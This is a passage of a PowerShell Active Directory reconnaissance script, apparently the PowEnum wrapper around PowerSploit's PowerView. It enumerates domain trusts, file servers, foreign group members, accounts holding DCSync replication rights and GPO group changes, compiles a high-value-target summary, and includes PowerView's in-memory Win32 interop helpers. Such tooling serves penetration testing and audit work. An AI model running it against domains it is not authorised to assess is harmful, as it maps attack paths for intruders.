		Write-Host "[ ]Potential Fileservers | " -NoNewLine
		$temp = Get-DomainFileServer -Domain $FQDN -Server $BestDomainControllerIP | Select-Object @{Name='FileServerName';Expression={$_}}
		PowEnum-ExportAndCount -TypeEnum FileServers
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-DomainTrusts {
	try{
		Write-Host "[ ]Domain Trusts | " -NoNewLine
		$temp = Get-DomainTrust -Domain $FQDN -Server $BestDomainControllerIP
		PowEnum-ExportAndCount -TypeEnum DomainTrusts
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-ForeignUsers {
	try{
		Write-Host "[ ]Foreign [Domain] Users | " -NoNewLine
		$temp = Get-DomainForeignUser -Domain $FQDN -Server $BestDomainControllerIP
		PowEnum-ExportAndCount -TypeEnum ForeignUsers
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-ForeignGroupMembers {
	try{
		Write-Host "[ ]Foreign [Domain] Group Members | " -NoNewLine
		$temp = Get-DomainForeignGroupMember -Domain $FQDN -Server $BestDomainControllerIP
		PowEnum-ExportAndCount -TypeEnum ForeignGroupMembers
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-ReplicationRights {
	try{
		Write-Host "[ ]All Users With Replication Rights (DCSync) | " -NoNewLine
		$temp = 
		Get-ObjectACL -Domain $FQDN -Server $BestDomainControllerIP -ResolveGUIDs | ? {
			($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')
		} | Select-Object -ExpandProperty SecurityIdentifier | ConvertFrom-SID
		PowEnum-ExportAndCount -TypeEnum ForeignGroupMembers
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-LocalGroupChanges {
	try{
		Write-Host "[ ]All Local Group Membership Modifications (GPO or GPP) | " -NoNewLine
		$temp = Get-DomainGPOLocalGroup -Domain $FQDN -Server $BestDomainControllerIP
		PowEnum-ExportAndCount -TypeEnum LocalGroupsChanges
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-OUTree {
	try{
		Write-Host "[ ]Organizational Unit (OU) Tree | " -NoNewLine
		$temp = Get-DomainOU -Domain $FQDN -Server $BestDomainControllerIP | Select-Object -ExpandProperty distinguishedname | %{ $a = $_ -split ','; [Array]::Reverse($a); $a -join ',' } | sort | Select-Object @{Name='Organizational Unit';Expression={$_}}
		PowEnum-ExportAndCount -TypeEnum OU_Tree
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-CreateSummary {
	try{
		Write-Host "[ ]Creating Summary | " -NoNewLine
		$HVTList = $null
		$HVTList = $script:Summary 
		
		$NewHVTList = $null
		$NewHVTList = @()
		foreach ($HVTUser in $HVTList) {
			
			#Create object list for this specific user (other words: grab all objects (groups) related to this username)
			$UserObjectList = $HVTList | Where-Object {$_.MemberName -contains $HVTUser.MemberName}
			$UsernameCount = $($UserObjectList | Measure-Object).Count

			#If the new HVT List already contains this user then skip because all entries would have been added already
			if ($($NewHVTList | Where-Object{$_.MemberName -eq $HVTUser.MemberName}).count -gt 0) {continue}

			#If the object is a group (not a user) then continue to next user
			elseif ($HVTUser.MemberObjectClass -eq "Group") {continue}
			
			#If more then one entry for this user, take each unique source, join it with the groups
			elseif ($UsernameCount -gt 1) {
					$GroupList = $($UserObjectList | Select-Object -Property Source -Unique)
					
					$GroupListStringTemp = $null
					$null = $GroupList | ForEach-Object {$GroupListStringTemp += $_.Source + ","}
					$GroupListStringTemp = $GroupListStringTemp.Substring(0,$GroupListStringTemp.Length-1)
					
					$CombinedUserObject = ($UserObjectList | Select-Object -First 1 MemberName,MemberDomain,@{n='Sources';e={$GroupListStringTemp}})
					$NewHVTList += $CombinedUserObject
					continue
			}
			elseif ($UsernameCount -eq 1) {
					$CombinedUserObject = ($UserObjectList | Select-Object -First 1 MemberName,MemberDomain,@{n='Sources';e={$_.Source}})
					$NewHVTList += $CombinedUserObject
					continue
			}
		}
		
		$temp = $NewHVTList | Select-Object * -Unique
		PowEnum-ExportAndCount -TypeEnum Summary
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-ExportAndCount {
	Param(
		[Parameter(Position = 0)]
		[String]
		$TypeEnum
	)
	
	if($temp -ne $null){
		
		#Grab the file name and the full path
		$exportfilename = $FQDN.Substring(0,$FQDN.IndexOf(".")) + '_' + $TypeEnum + '.csv'
		$exportfilepath = $script:CurrentPath + '\' + $exportfilename
		
		#Perform the actual export
		$temp | Select-Object * | Export-PowerViewCSV -Path ($exportfilepath)

		#Create new file object and add to array
		$ExportSheetFile = new-object psobject
		$ExportSheetFile | add-member NoteProperty Name $exportfilename
		$ExportSheetFile | add-member NoteProperty FullName $exportfilepath
		
		if($TypeEnum -eq "Summary") {
			$TempExportSheetFileArray = @()
			$TempExportSheetFileArray = $script:ExportSheetFileArray 
			$script:ExportSheetFileArray = @()
			$script:ExportSheetFileArray += $ExportSheetFile
			$script:ExportSheetFileArray += $TempExportSheetFileArray
		}
		else {$script:ExportSheetFileArray += $ExportSheetFile}
		
		$count = $temp | measure-object | select-object -expandproperty Count
	}
	if($temp -eq $null){
		$count = 0
	}
	Write-Host "$count Identified" -ForegroundColor Green
	$script:ExportSheetCount++
}

function PowEnum-ExcelFile {
	Param(
		[Parameter(Position = 0, Mandatory = $True)]
		[String]
		$SpreadsheetName
	)
	if ($NoExcel -eq $True) {Return}
	
	#try {
		Write-Host "[ ]Combining csv file(s) to xlsx | " -NoNewLine -ForegroundColor Cyan
		
		#Exit if enumeration resulting in nothing
		if($script:ExportSheetFileArray.Count -eq 0){Write-Warning "No Data Identified"; Return}
		
		$XLOutput =  $script:CurrentPath + "\" + 
			$FQDN + "_" + 
			$SpreadsheetName.Substring($SpreadsheetName.IndexOf("_")+1) + "_" + 
			$(get-random) + ".xlsx"

		# Create Excel object (visible), workbook and worksheet
		Add-Type -AssemblyName Microsoft.Office.Interop.Excel
		$Excel = New-Object -ComObject Excel.Application 
		$Excel.visible = $false
		$Excel.SheetsInNewWorkbook = $script:ExportSheetFileArray.Count
		$workbooks = $Excel.Workbooks.Add()
		$CSVSheet = 1

		Foreach ($CSV in $script:ExportSheetFileArray) {

			$worksheets = $workbooks.worksheets
			$CSVFullPath = $CSV.FullName
			
			$CSVName = ($CSV.name -split "\.")[0]
			$SheetName = ($CSVName.Substring($CSVName.LastIndexOf("_")+1))
			$worksheet = $worksheets.Item($CSVSheet)
			$worksheet.Name = $SheetName
			
			# Define the connection string and the starting cell for the data
			$TxtConnector = ("TEXT;" + $CSVFullPath)
			$CellRef = $worksheet.Range("A1")

			# Build, use and remove the text file connector
			$Connector = $worksheet.QueryTables.add($TxtConnector,$CellRef)
			$worksheet.QueryTables.item($Connector.name).TextFileCommaDelimiter = $True 
			$worksheet.QueryTables.item($Connector.name).TextFileParseType  = 1 
			$Null = $worksheet.QueryTables.item($Connector.name).Refresh()
			$worksheet.QueryTables.item($Connector.name).delete()

			# Autofit the columns, freeze the top row
			$worksheet.UsedRange.EntireColumn.ColumnWidth = 15

			# Set color & border to top header row
			$Selection = $worksheet.cells.Item(1,1).EntireRow
			$Selection.Interior.ColorIndex = 37
			$Null = $Selection.BorderAround(1)
			$Selection.Font.Bold=$True
			
			$CSVSheet++
		}

		# Save workbook and close Excel
		$workbooks.SaveAs($XLOutput,51)
		$workbooks.Saved = $true
		$workbooks.Close()
		$Null = [System.Runtime.Interopservices.Marshal]::ReleaseComObject($workbooks)
		$Excel.Quit()
		$Null = [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel)
		$CSVSheet--
		Write-Host "$CSVSheet Sheet(s) Processed" -ForegroundColor Green
		
	#}catch{Write-Warning "Error: Is Excel Installed?"}
}



##########
#                                                                                        
#   THESE ARE FUNCTIONS TAKEN DIRECTLY FROM POWERVIEW
#   https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1 
#   Author: Will Schroeder (@harmj0y)
#                                                                                        
##########


function New-InMemoryModule {
<#
.SYNOPSIS

Creates an in-memory assembly and module

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

When defining custom enums, structs, and unmanaged functions, it is
necessary to associate to an assembly module. This helper function
creates an in-memory module that can be passed to the 'enum',
'struct', and Add-Win32Type functions.

.PARAMETER ModuleName

Specifies the desired name for the in-memory assembly and module. If
ModuleName is not provided, it will default to a GUID.

.EXAMPLE

$Module = New-InMemoryModule -ModuleName Win32
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}

function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}

function Add-Win32Type {
<#
.SYNOPSIS

Creates a .NET type for an unmanaged Win32 function.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: func

.DESCRIPTION

Add-Win32Type enables you to easily interact with unmanaged (i.e.
Win32 unmanaged) functions in PowerShell. After providing
Add-Win32Type with a function signature, a .NET type is created
using reflection (i.e. csc.exe is never called like with Add-Type).

The 'func' helper function can be used to reduce typing when defining
multiple function definitions.

.PARAMETER DllName

The name of the DLL.

.PARAMETER FunctionName

The name of the target function.

.PARAMETER EntryPoint

The DLL export function name. This argument should be specified if the
specified function name is different than the name of the exported
function.

.PARAMETER ReturnType

The return type of the function.

.PARAMETER ParameterTypes

The function parameters.

.PARAMETER NativeCallingConvention

Specifies the native calling convention of the function. Defaults to
stdcall.

.PARAMETER Charset

If you need to explicitly call an 'A' or 'W' Win32 function, you can
specify the character set.

.PARAMETER SetLastError

Indicates whether the callee calls the SetLastError Win32 API
function before returning from the attributed method.

.PARAMETER Module

The in-memory module that will host the functions. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER Namespace

An optional namespace to prepend to the type. Add-Win32Type defaults
to a namespace consisting only of the name of the DLL.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$FunctionDefinitions = @(
  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Kernel32 = $Types['kernel32']
$Ntdll = $Types['ntdll']
$Ntdll::RtlGetCurrentPeb()
$ntdllbase = $Kernel32::GetModuleHandle('ntdll')
$Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')

.NOTES

Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189

When defining multiple function prototypes, it is ideal to provide
Add-Win32Type with an array of function signatures. That way, they
are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}

function psenum {
<#
.SYNOPSIS

Creates an in-memory enumeration for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

The 'psenum' function facilitates the creation of enums entirely in
memory using as close to a "C style" as PowerShell will allow.

.PARAMETER Module

The in-memory module that will host the enum. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the enum.

.PARAMETER Type

The type of each enum element.

.PARAMETER EnumElements

A hashtable of enum elements.

.PARAMETER Bitfield

Specifies that the enum should be treated as a bitfield.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
    UNKNOWN =                  0
    NATIVE =                   1 # Image doesn't require a subsystem.
    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
    POSIX_CUI =                7 # Image runs in the Posix character subsystem.
    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
    EFI_APPLICATION =          10
    EFI_BOOT_SERVICE_DRIVER =  11
    EFI_RUNTIME_DRIVER =       12
    EFI_ROM =                  13
    XBOX =                     14
    WINDOWS_BOOT_APPLICATION = 16
}

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Enum. :P
#>

    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}

function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}

function struct {
<#
.SYNOPSIS

Creates an in-memory struct for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: field

.DESCRIPTION

The 'struct' function facilitates the creation of structs entirely in
memory using as close to a "C style" as PowerShell will allow. Struct
fields are specified using a hashtable where each field of the struct
is comprosed of the order in which it should be defined, its .NET
type, and optionally, its offset and special marshaling attributes.

One of the features of 'struct' is that after your struct is defined,
it will come with a built-in GetSize method as well as an explicit
converter so that you can easily cast an IntPtr to the struct without
relying upon calling SizeOf and/or PtrToStructure in the Marshal
class.

.PARAMETER Module

The in-memory module that will host the struct. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the struct.

.PARAMETER StructFields

A hashtable of fields. Use the 'field' helper function to ease
defining each field.

.PARAMETER PackingSize

Specifies the memory alignment of fields.

.PARAMETER ExplicitLayout

Indicates that an explicit offset for each field will be specified.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
    DOS_SIGNATURE =    0x5A4D
    OS2_SIGNATURE =    0x454E
    OS2_SIGNATURE_LE = 0x454C
    VXD_SIGNATURE =    0x454C
}

$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
    e_magic =    field 0 $ImageDosSignature
    e_cblp =     field 1 UInt16
    e_cp =       field 2 UInt16
    e_crlc =     field 3 UInt16
    e_cparhdr =  field 4 UInt16
    e_minalloc = field 5 UInt16
    e_maxalloc = field 6 UInt16
    e_ss =       field 7 UInt16
    e_sp =       field 8 UInt16
    e_csum =     field 9 UInt16
    e_ip =       field 10 UInt16
    e_cs =       field 11 UInt16
    e_lfarlc =   field 12 UInt16
    e_ovno =     field 13 UInt16
    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
    e_oemid =    field 15 UInt16
    e_oeminfo =  field 16 UInt16
    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
    e_lfanew =   field 18 Int32
}

# Example of using an explicit layout in order to create a union.
$TestUnion = struct $Mod TestUnion @{
    field1 = field 0 UInt32 0
    field2 = field 1 IntPtr 0
} -ExplicitLayout

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Struct. :P
#>

    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}

Function New-DynamicParameter {
<#
.SYNOPSIS

Helper function to simplify creating dynamic parameters.

    Adapated from https://beatcracker.wordpress.com/2015/08/10/dynamic-parameters-validateset-and-enums/.
    Originally released under the Microsoft Public License (Ms-PL).

.DESCRIPTION

Helper function to simplify creating dynamic parameters.

Example use cases:
    Include parameters only if your environment dictates it
    Include parameters depending on the value of a user-specified parameter
    Provide tab completion and intellisense for parameters, depending on the environment

Please keep in mind that all dynamic parameters you create, will not have corresponding variables created.
    Use New-DynamicParameter with 'CreateVariables' switch in your main code block,
    ('Process' for advanced functions) to create those variables.
    Alternatively, manually reference $PSBoundParameters for the dynamic parameter value.

This function has two operating modes:

1. All dynamic parameters created in one pass using pipeline input to the function. This mode allows to create dynamic parameters en masse,
with one function call. There is no need to create and maintain custom RuntimeDefinedParameterDictionary.

2. Dynamic parameters are created by separate function calls and added to the RuntimeDefinedParameterDictionary you created beforehand.
Then you output this RuntimeDefinedParameterDictionary to the pipeline. This allows more fine-grained control of the dynamic parameters,
with custom conditions and so on.

.NOTES

Credits to jrich523 and ramblingcookiemonster for their initial code and inspiration:
    https://github.com/RamblingCookieMonster/PowerShell/blob/master/New-DynamicParam.ps1
    http://ramblingcookiemonster.wordpress.com/2014/11/27/quick-hits-credentials-and-dynamic-parameters/
    http://jrich523.wordpress.com/2013/05/30/powershell-simple-way-to-add-dynamic-parameters-to-advanced-function/

Credit to BM for alias and type parameters and their handling

.PARAMETER Name

Name of the dynamic parameter

.PARAMETER Type

Type for the dynamic parameter.  Default is string

.PARAMETER Alias

If specified, one or more aliases to assign to the dynamic parameter

.PARAMETER Mandatory

If specified, set the Mandatory attribute for this dynamic parameter

.PARAMETER Position

If specified, set the Position attribute for this dynamic parameter

.PARAMETER HelpMessage

If specified, set the HelpMessage for this dynamic parameter

.PARAMETER DontShow

If specified, set the DontShow for this dynamic parameter.
This is the new PowerShell 4.0 attribute that hides parameter from tab-completion.
http://www.powershellmagazine.com/2013/07/29/pstip-hiding-parameters-from-tab-completion/

.PARAMETER ValueFromPipeline

If specified, set the ValueFromPipeline attribute for this dynamic parameter

.PARAMETER ValueFromPipelineByPropertyName

If specified, set the ValueFromPipelineByPropertyName attribute for this dynamic parameter

.PARAMETER ValueFromRemainingArguments

If specified, set the ValueFromRemainingArguments attribute for this dynamic parameter

.PARAMETER ParameterSetName

If specified, set the ParameterSet attribute for this dynamic parameter. By default parameter is added to all parameters sets.

.PARAMETER AllowNull

If specified, set the AllowNull attribute of this dynamic parameter

.PARAMETER AllowEmptyString

If specified, set the AllowEmptyString attribute of this dynamic parameter

.PARAMETER AllowEmptyCollection

If specified, set the AllowEmptyCollection attribute of this dynamic parameter

.PARAMETER ValidateNotNull

If specified, set the ValidateNotNull attribute of this dynamic parameter

.PARAMETER ValidateNotNullOrEmpty

If specified, set the ValidateNotNullOrEmpty attribute of this dynamic parameter

.PARAMETER ValidateRange

If specified, set the ValidateRange attribute of this dynamic parameter

.PARAMETER ValidateLength

If specified, set the ValidateLength attribute of this dynamic parameter

.PARAMETER ValidatePattern

If specified, set the ValidatePattern attribute of this dynamic parameter

.PARAMETER ValidateScript

If specified, set the ValidateScript attribute of this dynamic parameter

.PARAMETER ValidateSet

If specified, set the ValidateSet attribute of this dynamic parameter

.PARAMETER Dictionary

If specified, add resulting RuntimeDefinedParameter to an existing RuntimeDefinedParameterDictionary.
Appropriate for custom dynamic parameters creation.

If not specified, create and return a RuntimeDefinedParameterDictionary
Appropriate for a simple dynamic parameter creation.
#>

    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$Name,

